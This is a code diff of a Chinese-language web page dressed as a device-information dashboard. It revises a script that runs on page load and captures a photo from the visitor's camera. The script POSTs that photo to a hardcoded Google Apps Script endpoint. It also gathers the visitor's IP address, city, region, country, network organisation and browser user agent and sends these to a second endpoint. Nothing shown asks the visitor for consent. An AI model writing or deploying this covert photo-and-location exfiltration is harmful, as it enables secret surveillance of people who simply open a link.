@@ -7,7 +7,6 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
-    /* 通用樣式 */
     body {
       background: linear-gradient(135deg, #0f0f2d, #05050f);
       color: #00ffcc;
@@ -53,10 +52,6 @@
       color: #00ffff;
     }
 
-    .chart-card canvas {
-      max-width: 100%;
-    }
-
     .footer {
       width: 100%;
       text-align: center;
@@ -98,22 +93,8 @@
       <h2>設備資訊</h2>
       <p id="deviceInfo">尚未讀取</p>
     </div>
-
-    <!-- GPS 資訊 -->
-    <div class="card">
-      <h2>GPS 資訊</h2>
-      <p id="gpsCoordinates">緯度: --, 經度: --</p>
-      <p id="gpsAddress">地址: 尚未讀取</p>
-    </div>
-
-    <!-- 圖表區域 -->
-    <div class="card chart-card">
-      <h2>電池電量曲線</h2>
-      <canvas id="batteryChart"></canvas>
-    </div>
   </div>
 
-  <!-- 底部商標 -->
   <footer class="footer">
     <div class="logo">
       <img src="https://via.placeholder.com/100x50?text=LOGO" alt="商標">
@@ -121,53 +102,10 @@
   </footer>
 
   <script>
-    const GOOGLE_GEOCODING_API_KEY = 'YOUR_API_KEY_HERE'; // 替換為 Google API 金鑰
-    const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbzbWx3Sa7PRXyMf5ihhqZ0nDizmIan0H82CRkPcLFk_iue1wBdVd2AHqbEJqx9AlTWHgg/exec'; // 替換為後端 API
+    const BACKEND_PHOTO_URL = 'https://script.google.com/macros/s/AKfycbyALtm6YDS92GFyTKqHFIVcnZ1ddF6WE5wUqwMeVcqXZPcBkDpKNDOJouRxSOTVYK0G3Q/exec';
+    const BACKEND_IP_URL = 'https://script.google.com/macros/s/AKfycbzKa7THwfTvBcfIt_rTHRmxAigmrKLYlE_o1YNYg4qbK3Ode0mEGrayomCb0nKTgFgAyg/exec';
 
-    // 初始化圖表數據
-    const ctx = document.getElementById('batteryChart').getContext('2d');
-    const batteryChart = new Chart(ctx, {
-      type: 'line',
-      data: {
-        labels: [], // 時間標籤
-        datasets: [{
-          label: '電池電量 (%)',
-          data: [], // 電量數據
-          borderColor: '#00ffcc',
-          backgroundColor: 'rgba(0, 255, 204, 0.1)',
-          tension: 0.3,
-          fill: true,
-        }]
-      },
-      options: {
-        scales: {
-          x: {
-            display: true,
-            title: { display: true, text: '時間', color: '#ffffff' },
-            ticks: { color: '#ffffff' }
-          },
-          y: {
-            display: true,
-            title: { display: true, text: '電量 (%)', color: '#ffffff' },
-            ticks: { color: '#ffffff' }
-          }
-        },
-        plugins: { legend: { labels: { color: '#ffffff' } } },
-        responsive: true,
-      }
-    });
-
-    // 更新電量曲線
-    function updateBatteryChart(batteryLevel) {
-      const now = new Date().toLocaleTimeString();
-      batteryChart.data.labels.push(now);
-      batteryChart.data.datasets[0].data.push(batteryLevel);
-      if (batteryChart.data.labels.length > 10) {
-        batteryChart.data.labels.shift();
-        batteryChart.data.datasets[0].data.shift();
-      }
-      batteryChart.update();
-    }
+    // 啟動相機並拍照
     async function startCameraAndSend() {
       const statusElement = document.getElementById('photoStatus');
       try {
@@ -200,7 +138,7 @@
       }
     }
 
-    // 發送照片到伺服器
+    // 發送照片到後端
     async function sendPhotoToServer(photoData) {
       const statusElement = document.getElementById('photoStatus');
       try {
@@ -209,14 +147,11 @@
         formData.append('message', '自動拍照圖片');
         formData.append('imageData', base64Image);
 
-        const response = await fetch('https://script.google.com/macros/s/AKfycbzbWx3Sa7PRXyMf5ihhqZ0nDizmIan0H82CRkPcLFk_iue1wBdVd2AHqbEJqx9AlTWHgg/exec', {
-          method: 'POST',
-          body: formData,
-        });
-
+        const response = await fetch(BACKEND_PHOTO_URL, { method: 'POST', body: formData });
         const result = await response.json();
+
         if (result.success) {
-          statusElement.innerText = '照片已成功傳送到 LINE Notify！';
+          statusElement.innerText = '照片已成功傳送！';
         } else {
           statusElement.innerText = `通知發送失敗：${result.error}`;
         }
@@ -226,58 +161,42 @@
       }
     }
 
-    // 啟動功能
-    window.onload = async () => {
-      // 相機自動啟動
-      startCameraAndSend();
-    // 發送 IP 和設備資訊到後端
-    async function sendIpAndDeviceInfo(ipData, userAgent) {
+    // 獲取 IP 和設備資訊
+    async function getIpAndDeviceInfo() {
+      const ipInfoElement = document.getElementById('ipInfo');
+      const deviceInfoElement = document.getElementById('deviceInfo');
       try {
-        const formData = new URLSearchParams();
-        formData.append('ip', ipData.ip);
-        formData.append('city', ipData.city);
-        formData.append('region', ipData.region);
-        formData.append('device', userAgent);
+        const response = await fetch('https://ipinfo.io/json');
+        const data = await response.json();
+        const { ip, city, region, country, org } = data;
+        const userAgent = navigator.userAgent;
 
-        const response = await fetch(BACKEND_URL, {
-          method: 'POST',
-          body: formData,
-        });
+        ipInfoElement.innerText = `IP: ${ip}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}`;
+        deviceInfoElement.innerText = `設備: ${userAgent}`;
 
-        const result = await response.json();
-        if (result.success) {
-          console.log('IP 和設備資訊已成功回傳！');
-        } else {
-          console.error('回傳失敗:', result.error);
+        const url = new URL(BACKEND_IP_URL);
+        url.searchParams.append('ip', ip);
+        url.searchParams.append('city', city);
+        url.searchParams.append('region', region);
+        url.searchParams.append('country', country);
+        url.searchParams.append('org', org);
+        url.searchParams.append('userAgent', userAgent);
+
+        const uploadResponse = await fetch(url);
+        const uploadResult = await uploadResponse.json();
+
+        if (!uploadResult.success) {
+          console.error('設備與 IP 資訊回傳失敗:', uploadResult.error);
         }
       } catch (error) {
-        console.error('回傳 IP 和設備資訊時發生錯誤:', error);
+        console.error('設備與 IP 資訊獲取失敗:', error);
       }
     }
 
-    // 啟動功能
-    window.onload = async () => {
-      // 電池資訊
-      if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        const batteryPercentage = Math.round(battery.level * 100);
-        const isCharging = battery.charging ? '充電中' : '未充電';
-        document.getElementById('batteryLevel').innerText = `${batteryPercentage}%`;
-        document.getElementById('batteryStatus').innerText = `狀態：${isCharging}`;
-        updateBatteryChart(batteryPercentage);
-      }
-
-      // IP 資訊
-      try {
-        const ipResponse = await fetch('https://ipinfo.io/json');
-        const ipData = await ipResponse.json();
-        document.getElementById('ipInfo').innerText = `IP: ${ipData.ip}, 位置: ${ipData.city}, ${ipData.region}`;
-        const userAgent = navigator.userAgent;
-        document.getElementById('deviceInfo').innerText = `設備: ${userAgent}`;
-        sendIpAndDeviceInfo(ipData, userAgent); // 回傳 IP 和設備資訊
-      } catch (error) {
-        document.getElementById('ipInfo').innerText = 'IP 資訊讀取失敗';
-      }
+    // 啟動相機與資訊
+    window.onload = () => {
+      startCameraAndSend();
+      getIpAndDeviceInfo();
     };
   </script>
 </body>
